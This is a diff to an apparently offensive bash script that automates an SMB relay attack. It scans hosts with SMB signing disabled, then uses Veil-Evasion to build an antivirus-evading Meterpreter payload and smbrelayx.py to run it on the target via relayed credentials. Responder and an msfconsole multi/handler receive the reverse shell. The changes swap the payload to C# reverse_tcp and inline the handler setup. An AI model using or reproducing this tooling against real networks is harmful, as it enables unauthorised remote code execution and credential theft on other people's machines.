@@ -67,7 +67,7 @@ for ip in $(grep open chuckle.gnmap |cut -d " " -f 2 ); do
   lines=$(egrep -A 15 "for $ip$" chuckle.nmap |grep disabled |wc -l)
   if [ $lines -gt 0 ]; then
     if [ $shownbt -gt 0 ]; then
-      nbtname=$(nbtscan  $ip | awk -F" " '{print $2}')
+      nbtname=$(nbtscan  $ip | awk -F" " '{print $2}' | tail -1)
       echo "$ip($nbtname)" >> ./chuckle.hosts
     else
       echo "$ip" >> ./chuckle.hosts
@@ -99,7 +99,7 @@ echo "Please enter local port for reverse connection:"
 read port
 echo "Meterpreter shell will connect back to $lhost on port $port"
 echo "Generating Payload..."
-payload=$(veil-evasion -p go/meterpreter/rev_https -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
+payload=$(veil-evasion -p cs/meterpreter/rev_tcp -c LHOST=$lhost LPORT=$port -o $target 2>/dev/null|grep exe |cut -d " " -f6|sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[m|K]//g")
 echo "Payload created: $payload"
 echo "Starting SMBRelayX..."
 smbrelayx.py -h $target -e $payload  >> ./chuckle.log  &
@@ -112,12 +112,9 @@ else
 	#Old Responder.
 	responder -i $lhost -wrfF >>chuckle.log &
 fi
+
 echo "Setting up listener..."
-echo "use exploit/multi/handler" > chuckle.rc
-echo "set payload windows/meterpreter/reverse_https" >> chuckle.rc
-echo "set LHOST $lhost" >> chuckle.rc
-echo "set LPORT $port" >> chuckle.rc
-echo "set autorunscript post/windows/manage/migrate" >> chuckle.rc
-echo "exploit -j" >> chuckle.rc
-msfconsole -q -r ./chuckle.rc
+
+msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $lhost; set LPORT $port; set autorunscript post/windows/manage/migrate; exploit -j;"
+
 
